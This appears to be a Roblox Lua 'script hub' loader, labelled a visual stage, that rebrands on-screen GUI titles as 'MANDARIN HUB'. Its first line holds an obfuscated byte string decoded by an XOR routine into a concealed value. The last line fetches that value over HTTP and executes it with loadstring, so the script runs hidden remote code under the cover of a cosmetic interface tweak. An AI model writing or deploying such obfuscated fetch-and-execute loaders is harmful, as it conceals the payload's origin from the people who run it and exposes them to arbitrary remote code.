
--[[ STAGE 2: VISUAL CORE ]]
local svhPgDWF7Jw3rJ="\015\062\057\056\032\020\106\021\221\041\206\002\196\205\253\244\226\240\232\149\238\156\150\133\129\182\128\178\167\248\190\173\170\147\095\089\069\093\076\079\114\073\103\109\103\087\111\026\030\031\002\049\002\050\061\101\034\057\044\210\028\035\045\059\037\214\040\201\210\229\236\226\144\134\150\237\139\129\140\136\136\130\165\167\085\090\090\071\186\070\078\075\083\097\127\125\116\019\024\006\016\025\026\113\124\055\099\062\058\021\045\030\219\205\220"local H0FPVTXQ2ijuH=215 local rRtLtx6OdklxqjM5t=107 local yKWWHgh2n04mjeK=1 local E8cG_thttyTAOPEE=5 local u8u3C9UfhbxVxX=0 local sCIOVZkD5v_YPjQvQfD=false local fba0KctD6nlwJ7HcZ4=bit32 and bit32.bxor if not fba0KctD6nlwJ7HcZ4 then fba0KctD6nlwJ7HcZ4=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local T8NAnJYGvAamtZiHyNbkve={}for Qk4qomJ1vG8JRE987pcax=1,#svhPgDWF7Jw3rJ do local soM0HkCVb9Y3=string.byte(svhPgDWF7Jw3rJ,Qk4qomJ1vG8JRE987pcax)local Nsq0STqunnDcrSPVgMWUd=(rRtLtx6OdklxqjM5t+(Qk4qomJ1vG8JRE987pcax*E8cG_thttyTAOPEE)+u8u3C9UfhbxVxX)%256 if yKWWHgh2n04mjeK==0 then soM0HkCVb9Y3=(soM0HkCVb9Y3-Nsq0STqunnDcrSPVgMWUd)%256 T8NAnJYGvAamtZiHyNbkve[Qk4qomJ1vG8JRE987pcax]=string.char(fba0KctD6nlwJ7HcZ4(soM0HkCVb9Y3,H0FPVTXQ2ijuH))else soM0HkCVb9Y3=fba0KctD6nlwJ7HcZ4(soM0HkCVb9Y3,H0FPVTXQ2ijuH)T8NAnJYGvAamtZiHyNbkve[Qk4qomJ1vG8JRE987pcax]=string.char((soM0HkCVb9Y3-Nsq0STqunnDcrSPVgMWUd)%256)end end local XPNta67eHWOWTQWrlwyi6=table.concat(T8NAnJYGvAamtZiHyNbkve)if sCIOVZkD5v_YPjQvQfD then XPNta67eHWOWTQWrlwyi6=string.reverse(XPNta67eHWOWTQWrlwyi6)end local u3FgfxgaVPs4LbwZO=XPNta67eHWOWTQWrlwyi6
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(u3FgfxgaVPs4LbwZO))()
